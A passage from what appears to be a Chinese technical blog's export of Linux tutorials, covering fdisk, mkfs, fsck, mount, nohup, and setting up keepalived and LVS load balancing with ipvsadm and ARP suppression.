wrong with that, but this is larger than 1024,and could in certain setups cause problems with:1) software that runs at boot time (e.g., old versions of LILO)2) booting and partitioning software from other OSs (e.g., DOS FDISK, OS/2 FDISK)Command (m for help): &lt;==等待你的输入！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入 m 后，就会看到底下这些命令介绍 123456789101112131415161718Command (m for help): m &lt;== 输入 m 后，就会看到底下这些命令介绍Command action a toggle a bootable flag b edit bsd disklabel c toggle the dos compatibility flag d delete a partition &lt;==删除一个partition l list known partition types m print this menu n add a new partition &lt;==新增一个partition o create a new empty DOS partition table p print the partition table &lt;==在屏幕上显示分割表 q quit without saving changes &lt;==不储存离开fdisk程序 s create a new empty Sun disklabel t change a partition's system id u change display/entry units v verify the partition table w write table to disk and exit &lt;==将刚刚的动作写入分割表 x extra functionality (experts only) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;离开 fdisk 时按下 q，那么所有的动作都不会生效！相反的， 按下w就是动作生效的意思。 123456789101112131415Command (m for help): p &lt;== 这里可以输出目前磁盘的状态Disk /dev/hdc: 41.1 GB, 41174138880 bytes &lt;==这个磁盘的文件名与容量255 heads, 63 sectors/track, 5005 cylinders &lt;==磁头、扇区与磁柱大小Units = cylinders of 16065 * 512 = 8225280 bytes &lt;==每个磁柱的大小 Device Boot Start End Blocks Id System/dev/hdc1 * 1 13 104391 83 Linux/dev/hdc2 14 1288 10241437+ 83 Linux/dev/hdc3 1289 1925 5116702+ 83 Linux/dev/hdc4 1926 5005 24740100 5 Extended/dev/hdc5 1926 2052 1020096 82 Linux swap / Solaris# 装置文件名 启动区否 开始磁柱 结束磁柱 1K大小容量 磁盘分区槽内的系统Command (m for help): q &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要不储存离开吗？按下 q 就对了！不要随便按 w 啊！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 p 可以列出目前这颗磁盘的分割表信息，这个信息的上半部在显示整体磁盘的状态。 磁盘格式化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘分割完毕后自然就是要进行文件系统的格式化，格式化的命令非常的简单，使用 mkfs（make filesystem） 命令。 语法：1mkfs [-t 文件系统格式] 装置文件名 选项与参数： -t ：可以接文件系统格式，例如 ext3, ext2, vfat 等(系统有支持才会生效) 实例1:查看 mkfs 支持的文件格式12[root@www ~]# mkfs[tab][tab]mkfs mkfs.cramfs mkfs.ext2 mkfs.ext3 mkfs.msdos mkfs.vfat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按下两个[tab]，会发现 mkfs 支持的文件格式如上所示。 实例:将分区 /dev/hdc6（可指定你自己的分区） 格式化为 ext3 文件系统：1234567891011121314151617181920212223[root@www ~]# mkfs -t ext3 /dev/hdc6mke2fs 1.39 (29-May-2006)Filesystem label= &lt;==这里指的是分割槽的名称(label)OS type: LinuxBlock size=4096 (log=2) &lt;==block 的大小配置为 4K Fragment size=4096 (log=2)251392 inodes, 502023 blocks &lt;==由此配置决定的inode/block数量25101 blocks (5.00%) reserved for the super userFirst data block=0Maximum filesystem blocks=51589939216 block groups32768 blocks per group, 32768 fragments per group15712 inodes per groupSuperblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912Writing inode tables: doneCreating journal (8192 blocks): done &lt;==有日志记录Writing superblocks and filesystem accounting information: doneThis filesystem will be automatically checked every 34 mounts or180 days, whichever comes first. Use tune2fs -c or -i to override.# 这样就创建起来我们所需要的 Ext3 文件系统了！简单明了！ 磁盘检验&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fsck（file system check）用来检查和维护不一致的文件系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若系统掉电或磁盘发生问题，可利用fsck命令对文件系统进行检查。 语法：1fsck [-t 文件系统] [-ACay] 装置名称 选项与参数： -t : 给定档案系统的型式，若在 /etc/fstab 中已有定义或 kernel 本身已支援的则不需加上此参数 -s : 依序一个一个地执行 fsck 的指令来检查 -A : 对/etc/fstab 中所有列出来的 分区（partition）做检查 -C : 显示完整的检查进度 -d : 打印出 e2fsck 的 debug 结果 -p : 同时有 -A 条件时，同时有多个 fsck 的检查一起执行 -R : 同时有 -A 条件时，省略 / 不检查 -V : 详细显示模式 -a : 如果检查有错则自动修复 -r : 如果检查有错则由使用者回答是否修复 -y : 选项指定检测每个文件是自动输入yes，在不确定那些是不正常的时候，可以执行 # fsck -y 全部检查修复。 实例1:查看系统有多少文件系统支持的 fsck 命令：12[root@www ~]# fsck[tab][tab]fsck fsck.cramfs fsck.ext2 fsck.ext3 fsck.msdos fsck.vfat 实例:强制检测 /dev/hdc6 分区:123456789[root@www ~]# fsck -C -f -t ext3 /dev/hdc6 fsck 1.39 (29-May-2006)e2fsck 1.39 (29-May-2006)Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary informationvbird_logical: 11/251968 files (9.1% non-contiguous), 36926/1004046 blocks &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果没有加上 -f 的选项，则由于这个文件系统不曾出现问题，检查的经过非常快速！若加上 -f 强制检查，才会一项一项的显示过程。 磁盘挂载与卸除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 的磁盘挂载使用 mount 命令，卸载使用 umount 命令。 磁盘挂载语法：1mount [-t 文件系统] [-L Label名] [-o 额外选项] [-n] 装置文件名 挂载点 实例1:用默认的方式，将刚刚创建的 /dev/hdc6 挂载到 /mnt/hdc6 上面！123456[root@www ~]# mkdir /mnt/hdc6[root@www ~]# mount /dev/hdc6 /mnt/hdc6[root@www ~]# dfFilesystem 1K-blocks Used Available Use% Mounted on.....中间省略...../dev/hdc6 1976312 42072 1833836 3% /mnt/hdc6 磁盘卸载命令 umount 语法：1umount [-fn] 装置文件名或挂载点 选项与参数： -f ：强制卸除！可用在类似网络文件系统 (NFS) 无法读取到的情况下； -n ：不升级 /etc/mtab 情况下卸除。 卸载/dev/hdc61[root@www ~]# umount /dev/hdc6]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- nohup]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F83.%20Linux%20%E5%91%BD%E4%BB%A4-%20nohup%2F</url>
    <content type="text"><![CDATA[Linux 命令- nohup&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在应用Unix/Linux时，我们一般想让某个程序在后台运行，于是我们将常会用 &amp; 在程序结尾来让程序自动运行。比如我们要运行mysql在后台： /usr/local/mysql/bin/mysqld_safe –user=mysql &amp;。可是有很多程序并不想mysqld一样，这样我们就需要nohup命令 命令语法1nohup command [Arg……] [&amp;] 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不挂断的运行命令。 命令描述&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nohup命令运行由command参数和任何香断的Arg参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用nohup命令运行后台中的程序。要运行后台中的nohup命令，添加 &amp; （表示“and”的符号）到命令的尾部。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;无论是否将nohup命令的输出重定向到终端，输出都将附加到当前目录的nohup.out文件中。如果当前目录的nohup.out文件不可写，输出重定向到$HOME/nohup.out文件中。如果没有文件能创建或打开以用于追加，那么Command参数指定的命令不可调用。如果标准错误是一个终端，那么把指定的命令写给标准错误的所有输出作为标准输出重定向到相同的文件描述符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退出状态：该命令返回下列出口值： 126 可以查找但不能调用Command参数指定的命令。 127 nohup命令发生错误或不能查找有Command参数指定的命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;否则，nohup命令的退出状态是Command参数指定命令的退出状态。 nohup命令及其输出文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你正在运行一个进程，而且你觉得在退出账户时该进程还不会结束，那么可以使用nohup命令。该命令可以在退出账户或者关闭终端之后继续运行相应的进程。nohup就是不挂起的意思（ no hang up）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该命令的一般形式为：nohup command &amp; 使用nohup命令提交作业&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用nohup提交作业，那么在缺省情况下该作业的所有输出都被重定向到一名为nohup.out的文件中，除非另外指定了输出文件： 1nohup command &gt; muout.file 2&gt;&amp;1 &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例中，输出被重定向到myout.file文件中。 实例123456[root@localhost ~]# cat /usr/local/sbin/sleep.sh#! /bin/bashsleep 1000[root@localhost ~]# nohup sh /usr/local/sbin/sleep.sh &amp;[1] 19997[root@localhost ~]# nohup: 忽略输入并把输出追加到"nohup.out" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接加一个 &amp; 虽然丢到后台了，但是当退出该终端时很有可能这个脚本也会退出，而在前面加上 nohup 就没有问题了，nohup的作用就是不挂断运行的命令。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS原理详解及部署之四：keepalived介绍]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F11.%20LVS%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%E5%8F%8A%E9%83%A8%E7%BD%B2%E4%B9%8B%E5%9B%9B%EF%BC%9Akeepalived%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[LVS原理详解及部署之四：keepalived介绍一、keepalived原理介绍keepalived简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Keepalived的功能有点像是两个人互相看着一个工作，如果一个人离开岗位另外一个人就会接替，这个keepalived就是他们之间保持这样“替换机制”的工具。keepalived是一个类似于layer3, 4 &amp; 5交换机制的软件，也就是我们平时说的第3层、第4层和第5层交换。Keepalived的作用是检测web服务器的状态，如果有一台web服务器死机，或工作出现故障，Keepalived将检测到，并将有故障的web服务器从系统中剔除，当web服务器工作正常后Keepalived自动将web服务器加入到服务器群中，这些工作全部自动完成，不需要人工干涉，需要人工做的只是修复故障的web服务器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Keepalived服务主要有两大用途：heartbeat（高可用）&amp;failover（健康检测） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Keepalived服务主要截图vrrp来完成这些工作的，以下我就来介绍下VRRP协议是怎样的工作的，那么基本上keepalived的工作原理就是如此。 VRRP协议（VRRP Virtual Router Redundancy Protocol，虚拟路由冗余协议）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VRRP协议过程简述：VRRP 将局域网的一组路由器（包括一个Master 即活动路由器和若干个Backup 即备份路由器）组织成一个虚拟路由器，称之为一个备份组。这个虚拟的路由器拥有自己的IP 地址10.100.10.1（这个IP 地址可以和备份组内的某个路由器的接口地址相同，相同的则称为ip拥有者），备份组内的路由器也有自己的IP 地址（如Master的IP 地址为10.100.10.2，Backup 的IP 地址为10.100.10.3）。局域网内的主机仅仅知道这个虚拟路由器的IP 地址10.100.10.1，而并不知道具体的Master 路由器的IP 地址10.100.10.2 以及Backup 路由器的IP 地址10.100.10.3。[1]它们将自己的缺省路由下一跳地址设置为该虚拟路由器的IP 地址10.100.10.1。于是，网络内的主机就通过这个虚拟的路由器来与其它网络进行通信。如果备份组内的Master 路由器坏掉，Backup 路由器将会通过选举策略选出一个新的Master 路由器，继续向网络内的主机提供路由服务。从而实现网络内的主机不间断地与外部网络进行通信。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VRRP原理： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个VRRP路由器有唯一的标识：VRID，范围为0—255该路由器对外表现为唯一的虚拟MAC地址，地址的格式为00-00-5E-00-01-[VRID]主控路由器负责对ARP请求用该MAC地址做应答这样,无论如何切换，保证给终端设备的是唯一一致的IP和MAC地址，减少了切换对终端设备的影响[3] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VRRP控制报文只有一种：VRRP通告(advertisement)它使用IP多播数据包进行封装，组地址为224.0.0.18，发布范围只限于同一局域网内这保证了VRID在不同网络中可以重复使用为了减少网络带宽消耗只有主控路由器才可以周期性的发送VRRP通告报文备份路由器在连续三个通告间隔内收不到VRRP或收到优先级为0的通告后启动新的一轮VRRP选举[3] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在VRRP路由器组中，按优先级选举主控路由器，VRRP协议中优先级范围是0—255若VRRP路由器的IP地址和虚拟路由器的接口IP地址相同，则称该虚拟路由器作VRRP组中的IP地址所有者；IP地址所有者自动具有最高优先级：255优先级0一般用在IP地址所有者主动放弃主控者角色时使用可配置的优先级范围为1—254优先级的配置原则可以依据链路的速度和成本路由器性能和可靠性以及其它管理策略设定主控路由器的选举中，高优先级的虚拟路由器获胜，因此，如果在VRRP组中有IP地址所有者，则它总是作为主控路由的角色出现对于相同优先级的候选路由器，按照IP地址大小顺序选举VRRP还提供了优先级抢占策略，如果配置了该策略，高优先级的备份路由器便会剥夺当前低优先级的主控路由器而成为新的主控路由器[3] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了保证VRRP协议的安全性，提供了两种安全认证措施：明文认证和IP头认证明文认证方式要求：在加入一个VRRP路由器组时，必须同时提供相同的VRID和明文密码适合于避免在局域网内的配置错误，但不能防止通过网络监听方式获得密码IP头认证的方式提供了更高的安全性，能够防止报文重放和修改等攻击。 二、部署keepalived作为web服务器的HA 部署两台apache web服务器 12yum install httpd -y /etc/init.d/httpd start 分别安装keepalived软件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载安装 1234567wget http://www.keepalived.org/software/keepalived-1.2.8.tar.gztar -zxf keepalived-1.2.8.tar.gzcd keepalived-1.2.8ll./configure --prefix=/usr/local/keepalivedmakemake install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置keepalived的自启动&amp;拷贝keepalived的执行程序 12345cp /usr/local/keepalive/sbin/keepalived/ /usr/sbin/cp cp /usr/local/keepalived/sbin/keepalived /usr/sbin//usr/local/keepalived/sbin/keepalivedcp /usr/local/keepalived/sbin/keepalived /usr/sbin/cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/cp /usr/local/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/ 编辑主web和备web的keepalived配置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主web服务器的配置文件 12345678910111213141516171819202122232425[root@localhost keepalived-1.2.8]# cat /etc/keepalived.conf ! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; #设置报警邮件地址，可多行每行一个。 752119102@qq.com &#125; notification_email_from keepalived@localhost #设置邮件的发送地址 smtp_server 127.0.0.1 #设置SMTP server地址 smtp_connect_timeout 30 #设置SMTP 超时时间 router_id LVS_DEVEL #运行keepalived机器的一个标识&#125;vrrp_instance VI_1 &#123; #定义一个vrrp实例，不同实例的实例编号不一样。 state MASTER #定义在keepalived的角色MASTER表示为主服务器，BACKUP为备服务器。 interface eth0 #指定HA检测的网络接口 virtual_router_id 51 #虚拟路由标示，同一个实例里的路由标示相同，且唯一。MASTER和BACKUP的路由标识一样，且唯一。 priority 100 #定义此服务器在此虚拟路由器中的优先级，优先级大权限高 advert_int 1 #检测时间间隔 authentication &#123; #设置验证类型和密码，主从的密码必须相同，要不两者不通讯。 auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; #设置虚拟IP地址，可以设置多个虚拟IP地址。 192.168.41.249 &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备web服务器的配置文件 12345678910111213141516171819202122232425[root@localhost ~]# cat /etc/keepalived.conf! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; 752119102@qq.com &#125; notification_email_from keepalive@localhost smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id LVS_DEVEL&#125;vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 51 priority 50 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.41.249 &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动keepalived服务 12/etc/init.d/keepalived start/etc/init.d/keepalived stop 查看keepalived日志信息 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主web服务器 12345678910111213141516Jan 14 20:27:41 localhost Keepalived_vrrp[20840]: Opening file '/etc/keepalived/keepalived.conf'.Jan 14 20:27:41 localhost Keepalived_vrrp[20840]: Configuration is using : 36304 BytesJan 14 20:27:41 localhost Keepalived_vrrp[20840]: Using LinkWatch kernel netlink reflector...Jan 14 20:27:41 localhost Keepalived[20837]: Starting VRRP child process, pid=20840Jan 14 20:27:41 localhost Keepalived_vrrp[20840]: VRRP sockpool: [ifindex(2), proto(112), unicast(0), fd(11,12)]Jan 14 20:27:42 localhost Keepalived_vrrp[20840]: VRRP_Instance(VI_1) Transition to MASTER STATEJan 14 20:27:43 localhost Keepalived_vrrp[20840]: VRRP_Instance(VI_1) Entering MASTER STATEJan 14 20:27:43 localhost Keepalived_vrrp[20840]: VRRP_Instance(VI_1) setting protocol VIPs.Jan 14 20:27:43 localhost Keepalived_vrrp[20840]: VRRP_Instance(VI_1) Sending gratuitous ARPs on eth0 for 192.168.41.249Jan 14 20:27:43 localhost Keepalived_vrrp[20840]: Netlink reflector reports IP 192.168.41.249 addedJan 14 20:27:43 localhost avahi-daemon[3207]: Registering new address record for 192.168.41.249 on eth0.Jan 14 20:27:43 localhost Keepalived_healthcheckers[20839]: Netlink reflector reports IP 192.168.41.249 addedJan 14 20:27:44 localhost avahi-daemon[3207]: Invalid query packet.Jan 14 20:27:46 localhost last message repeated 8 timesJan 14 20:27:48 localhost Keepalived_vrrp[20840]: VRRP_Instance(VI_1) Sending gratuitous ARPs on eth0 for 192.168.41.249Jan 14 20:27:48 localhost avahi-daemon[3207]: Invalid query packet. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备web服务器日志 123456Jan 14 19:55:26 localhost Keepalived_vrrp[19423]: Opening file '/etc/keepalived/keepalived.conf'.Jan 14 19:55:26 localhost Keepalived_vrrp[19423]: Configuration is using : 36302 BytesJan 14 19:55:26 localhost Keepalived_vrrp[19423]: Using LinkWatch kernel netlink reflector...Jan 14 19:55:26 localhost Keepalived[19420]: Starting VRRP child process, pid=19423Jan 14 19:55:26 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) Entering BACKUP STATEJan 14 19:55:26 localhost Keepalived_vrrp[19423]: VRRP sockpool: [ifindex(2), proto(112), unicast(0), fd(11,12)] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当主web服务器的keepalived停掉后，及主keepalived重新启动时的日志： 1234567891011Jan 14 20:25:57 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) Transition to MASTER STATEJan 14 20:25:58 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) Entering MASTER STATEJan 14 20:25:58 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) setting protocol VIPs.Jan 14 20:25:58 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) Sending gratuitous ARPs on eth0 for 192.168.41.249Jan 14 20:25:58 localhost Keepalived_vrrp[19423]: Netlink reflector reports IP 192.168.41.249 addedJan 14 20:25:58 localhost Keepalived_healthcheckers[19422]: Netlink reflector reports IP 192.168.41.249 addedJan 14 20:26:03 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) Sending gratuitous ARPs on eth0 for 192.168.41.249###主keepalived重新启动后Jan 14 20:27:42 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) Received higher prio advertJan 14 20:27:42 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) Entering BACKUP STATEJan 14 20:27:42 localhost Keepalived_vrrp[19423]: VRRP_Instance(VI_1) removing protocol VIPs. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;并且通过tcpdump vrrp能够看到两者之间的通讯 12345678910[root@localhost ~]# tcpdump vrrptcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes20:38:58.657600 IP 192.168.41.33 &gt; vrrp.mcast.net: VRRPv2, Advertisement, vrid 51, prio 100, authtype simple, intvl 1s, length 2020:38:59.658287 IP 192.168.41.33 &gt; vrrp.mcast.net: VRRPv2, Advertisement, vrid 51, prio 100, authtype simple, intvl 1s, length 2020:39:00.659280 IP 192.168.41.33 &gt; vrrp.mcast.net: VRRPv2, Advertisement, vrid 51, prio 100, authtype simple, intvl 1s, length 2020:39:01.660358 IP 192.168.41.33 &gt; vrrp.mcast.net: VRRPv2, Advertisement, vrid 51, prio 100, authtype simple, intvl 1s, length 2020:39:02.661203 IP 192.168.41.33 &gt; vrrp.mcast.net: VRRPv2, Advertisement, vrid 51, prio 100, authtype simple, intvl 1s, length 2020:39:03.662205 IP 192.168.41.33 &gt; vrrp.mcast.net: VRRPv2, Advertisement, vrid 51, prio 100, authtype simple, intvl 1s, length 2020:39:04.663129 IP 192.168.41.33 &gt; vrrp.mcast.net: VRRPv2, Advertisement, vrid 51, prio 100, authtype simple, intvl 1s, length 20 三、脚本实现监控httpd服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前keepalived能够实现当我们的主web宕机或者网络出现故障时进行切换，但如果仅是httpd进程出现故障，所以我们就需要写一点实时监控httpd进程状态的脚本，即如果进程出现问题我们就进行切换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本内容： 123456789101112131415#!/bin/bashwhile truedo httpdpid=`ps -C httpd --no-heading |wc -l` if [ $httpdpid -eq 0 ];then /etc/init.d/httpd start sleep 5 httpdpid=`ps -C httpd --no-heading |wc -l` if [ $httpdpid -eq 0 ];then /etc/init.d/keepalive stop fi fi sleep 5done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即当我们的httpd进程被停止了，并且无法重启我们会将keepalived进行停止，让备web服务器进行接管，成为主WEB服务器提供服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到此我们已经能够轻松的部署keepalived让它作为web服务器的HA.]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS原理详解及部署之三：手动部署LVS]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F10.%20LVS%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%E5%8F%8A%E9%83%A8%E7%BD%B2%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%89%8B%E5%8A%A8%E9%83%A8%E7%BD%B2LVS%2F</url>
    <content type="text"><![CDATA[LVS原理详解及部署之三：手动部署LVS一、环境需求&amp;安装LVS软件环境准备：三台虚拟机&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此环境是针对内部服务的LVS架构，如数据库，缓存，共享存储等业务。 虚拟机角色 IP地址 备注 LVS负载均衡器 192.168.41.181 VIP地址：192.168.40.17 http服务器 RS1192.168.41.31 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; http服务器 RS2192.168.41.33 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 安装LVS软件 在安装LVS软件之前，先确定两条HTTPserver是能够正常访问的。 下载软件 1wget http://www.linuxvirtualserver.org/software/kernel-2.6/ipvsadm-1.24.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里使用的2.4版本，并且注意内核是2.6版本的，如果版本是6.X版本的话，那么可以使用2.6版本 编译安装 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要创建一个软连接：ln -s /usr/src/kernels/2.6.18-238.el5-i686 /usr/src/linux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此处粗体根据自己的系统来进行定义，可以使用tab键来补齐。 123456tar -zxf ipvsadm-1.24.tar.gzcd ipvsadm-1.24makemake installlsmod |grep ip_vsipvsadm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为此时系统还没有把ipvs模块加载进系统，需要我们执行ipvsadm命令才会加载进去,或者modprobe ip_vs。 123[root@localhost ipvsadm-1.24]# lsmod |grep ip_vsip_vs_rr 6081 1ip_vs 78081 3 ip_vs_rr 二、手动配置LVS负载均衡器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正常工作中是不会手动配置的，也不会使用脚本配置的。最终我们是通过配置文件生效的，结合keepalived来进行部署的。 负载均衡器上配置VIP地址 12ifconfig eth0:1 192.168.40.17 netmask 255.255.254.0route add -host 192.168.40.17 dev eth0 ipvsadm添加LVS服务 参数 参数说明 -A -A –add-service 添加一个带选项的虚拟服务。Add a virtual service. A serviceaddress is uniquely defined by a triplet: IP address, portnumber, and protocol. Alternatively a virtualservice may be defined by a firewall-mark. -t 指定虚拟服务器的IP地址和端口 -s -s,–scheduler scheduling-method 调度算法 -p 会话保持按秒计算 -a -a在对应的VIP下添加RS节点 -g 指定此LVS的工作模式为-g -g为DR模式 -l 指定LVS的工作模式为-l -l为tunnel模式 -m 指定LVS的工作模式为NAT模式 -w 指定RS节点的权重 -D 删除虚拟服务.格式：ipvsadm-D -t u f service-address. Delete a virtual service, alongwith any associated real servers. -C -C, –clear Clear the virtual server table清空lvs原有的配置。 -set 设置tcp tcpfn udp 的连接超时时间（一般来说高并发的时候小一点点。 12345ipvsadm -C #请用LVS原有的配置ipvsadm -A -t 192.168.40.17:80 -s rr -p 20 #添加虚拟服务指定VIPipvsadm -a -t 192.168.40.17:80 -r 192.168.41.31:80 -g -w 10#针对虚拟服务添加RS节点ipvsadm -a -t 192.168.40.17:80 -r 192.168.41.33:80 -g -w 10ipvsadm -L -n #查看VIP和RS是否已经配置成功。 1234567[root@localhost ~]# ipvsadm -L -nIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.40.17:80 rr persistent 20 -&gt; 192.168.41.33:80 Route 10 0 0 -&gt; 192.168.41.31:80 Route 10 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LB上删除虚拟服务 1ipvsadm -D -t 192.168.40.17:80 三、RS节点服务器手动配置 添加lo端口的VIP&amp;路由 1ifconfig lo 192.168.40.17 netmask 255.255.255.255 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;(由于RS的VIP不是用来通讯，并且这里一定要设置24位掩码） 1route add -host 192.168.40.17 dev lo ARP抑制 1234echo "1"&gt;/proc/sys/net/ipv4/conf/lo/arp_ignoreecho "2"&gt;/proc/sys/net/ipv4/conf/lo/arp_announce echo "1"&gt;/proc/sys/net/ipv4/conf/all/arp_announceecho "2"&gt;/proc/sys/net/ipv4/conf/all/arp_announce 四、测试LVS是否生效&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在LB上面输入命令ipvsadm -L -n就能够查看LB上面的会话分配。在前面加上watch可以动态的查看ipvsadm的会话分配。watch ipvsadm -L -n. 测试RS节点是否正常访问 测试从LB能否正常访问RS 测试客户端能否正常访问VIP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在测试的时候可以先把防火墙关闭掉，一般按照这样配置就能够实现LVS的负载均衡了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至此我们的LVS DR模式负载均衡已经配置完成了。至于不同的调度算法啊-s 不同的工作模式-g(DR) -l(TUNNEL) -m(NAT)服务器端基本上没有什么差别。只是在客户端上有一定的差别。 NAT模式：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端同样需要配置VIP，进行ARP抑制，并且要服务器端开启内核转发功能，配置LB的DIP(内网IP地址）作为默认网关。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开启内核转发功能： 1234vim /etc/sysctlnet.ipv4.ip_forword = 1route add default gw 192.168.41.181 Tunnel模式：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端需要先开启Tunnel协议支持。 12345678/sbin/modprobe ipip/sbin/route add –host 192.168.40.17 devtun1echo”1”&gt;/proc/sys/net/ipv4/conf/tun1/arp-ignoreecho”2”&gt;/proc/sys/net/ipv4/conf/tun1/arp_announceecho”0” &gt;/proc/sys/net/ipv4/conf/tun1/rp_filterecho”1” &gt;/proc/sys/net/ipv4/conf/tun1/forwardingecho”1” &gt;/proc/sys/net/ipv4/conf/all/arp_ignoreecho”2” &gt;/proc/sys/net/ipv4/conf/all/ arp_announce 五、部署成功后的另一些问题 当我们的RS节点出现问题，LB如何知道。如果不知道是会把会话连接接续转发到RS上面。 如果LB出现故障，那么整个网络就出现故障。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;针对上面的1问题，我们就需要一种RS节点健康检查机制。定时的去检测RS是否正常，如果出现不正常那么就把这个RS从VIP服务里面删除掉。如果恢复正常了，就再把RS添加进来。针对2问题，我们可以另外再架设一台LB服务器，作为备LB服务器。那么当主LB出现故障，备LB服务器就会启动接管主LB服务器的工作，接管它的资源（IP地址，在网络中的角色身份等） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而上面提到的这些我们就需要结合keepalived来完成。所以后续我们开始讲keepalived+lvs结合适用。完成RS节点健康检查和LVS的高可用性功能。]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- sed]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F70.%20Linux%20%E5%91%BD%E4%BB%A4-%20sed%2F</url>
